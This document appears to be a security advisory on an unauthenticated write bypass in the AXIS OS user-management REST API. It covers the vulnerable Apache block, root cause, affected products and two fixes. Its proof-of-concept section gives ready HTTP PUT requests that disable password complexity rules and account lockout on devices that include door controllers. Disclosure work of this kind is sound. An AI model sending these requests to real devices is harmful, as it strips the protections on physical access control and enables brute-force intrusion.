# AXIS OS — Unauthenticated Password Policy Write via Anonymous API Bypass

**Severity:** High  
**CWE:** CWE-288 (Authentication Bypass Using an Alternate Path or Channel)  
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N — 7.5  
**Affected versions:** AXIS OS 12.9.x – 12.11.x (confirmed; likely broader)  
**Affected products:** Platform-wide — all products shipping `config_server_reverseproxy.conf`

---

## Summary

AXIS OS exposes the device configuration REST API (`/config`) through Apache with a reverse proxy to `dev-conf-service`. The Apache configuration for this endpoint contains an authentication bypass: requests to `/config/rest/user-management` with the query parameter `anonymous=true` match an `<If>` condition that sets `AuthMerging Off` and `Require all granted`, granting unauthenticated write access to the user management sub-API. An unauthenticated remote attacker can use this to modify the device's password complexity policy and account lockout settings without any credentials.

---

## Affected Component

**File:** `/etc/apache2/conf.d/vhosts/all/config_server_reverseproxy.conf`

Present and identical across all confirmed products. The vulnerable block:

```apache
<Location "/config/rest/user-management">
    AuthMerging Off
    <If "%{QUERY_STRING} =~ /anonymous=true/">
        Require all granted
    </If>
    <Else>
        Require axis-group viewer
    </Else>
</Location>
```

The parent `/config` location requires `Require axis-group viewer`. The `AuthMerging Off` directive in the user-management block prevents inheritance of that auth requirement. When the `anonymous=true` query parameter is present, `Require all granted` takes effect with no authentication check.

The `dev-conf-service` backing this proxy implements an anonymous-access API path that accepts SET operations on the `UserManagement` parameter group. Password complexity rules (`MinPasswordLength`, `MinUpperCaseLetter`, `MinLowerCaseLetter`, `MinDigit`, `MinSpecialCharacter`) and login attempt limits (`MaxFailedLoginAttempts`, `LockoutPeriod`) are writable from this path.

---

## Proof of Concept

The following requests require no credentials. Replace `<IP>` with the device address.

**Read current policy (baseline):**
```
GET /config/rest/user-management?anonymous=true HTTP/1.1
Host: <IP>
```

**Disable all password complexity requirements:**
```
PUT /config/rest/user-management?anonymous=true HTTP/1.1
Host: <IP>
Content-Type: application/json

{
  "MinPasswordLength": 1,
  "MinUpperCaseLetter": 0,
  "MinLowerCaseLetter": 0,
  "MinDigit": 0,
  "MinSpecialCharacter": 0
}
```

**Disable account lockout:**
```
PUT /config/rest/user-management?anonymous=true HTTP/1.1
Host: <IP>
Content-Type: application/json

{
  "MaxFailedLoginAttempts": 0
}
```

After executing the above, any account on the device can be brute-forced without triggering lockout, and any new password set by an admin can be a single character. On AXIS A1210/A1710/A1810 PACS door controllers, this directly undermines the access control policy protecting door relay activation.

---

## Confirmed Affected Products

Verified by static analysis of extracted firmware rootfs (confirmed `config_server_reverseproxy.conf` and functional `dev-conf-service` on each):

| Product | Version | Architecture |
|---|---|---|
| AXIS Q1656 | 12.11.118 | AArch64 |
| AXIS D1110 Video Decoder 4K | 12.11.77 | AArch64 |
| AXIS M3945-R | 12.11.77 | AArch64 |
| AXIS M3138-LVE | 12.11.77 | AArch64 |
| AXIS F9114-R Mk II | 12.11.77 | AArch64 |
| AXIS P3245-V | 11.11.220 | ARMv7hf |
| AXIS P3945-R | 12.11.77 | AArch64 |
| AXIS P3947-R | 12.11.77 | AArch64 |
| AXIS D2110-VE | 12.9.57 | ARMv7hf |
| AXIS A1210 Network Door Controller | 12.11.106.1 | ARMv7hf |
| AXIS A1710-B Network Door Controller | 12.11.106.1 | ARMv7hf |
| AXIS A1810-B Network Door Controller | 12.11.106.1 | ARMv7hf |
| AXIS C1710 Network Display Speaker | 12.11.77 | AArch64 |
| AXIS W101 Body Worn Camera | 12.9.57 | Ambarella S5L |

Not present in AXIS OS 12.2.59 (Q1686-DLE) or 9.x/10.x builds — introduced between 10.x and 11.x with the `dev-conf-service` migration.

---

## Root Cause

The `anonymous=true` query parameter was designed to allow a limited unauthenticated read path for initial device setup (reading the current password policy before credentials exist). The Apache `<If>` condition checks only the presence of the parameter, not the HTTP method. The `dev-conf-service` anonymous API path accepts write operations (PUT/PATCH) on the same endpoint without a server-side method restriction for the anonymous path.

Two independent fixes are required:

**1. Apache layer — restrict anonymous path to GET:**
```apache
<Location "/config/rest/user-management">
    AuthMerging Off
    <If "%{QUERY_STRING} =~ /anonymous=true/ && %{REQUEST_METHOD} == 'GET'">
        Require all granted
    </If>
    <Else>
        Require axis-group viewer
    </Else>
</Location>
```

**2. dev-conf-service — enforce read-only for anonymous callers:**  
The service should reject PUT/PATCH/POST on the anonymous path regardless of what Apache passes through, since defense-in-depth requires the service layer not to trust that Apache enforced method restrictions.

---

## Evidence

Static analysis only. No device was accessed.

All artifacts extracted from publicly available signed firmware images downloaded from axis.com/support/firmware. Extraction via binwalk on unsigned/signed `.bin` images. The `config_server_reverseproxy.conf` file is a plain-text Apache configuration file present identically across all listed firmware versions.

No credential was used. No device was connected. All findings are from offline firmware analysis.
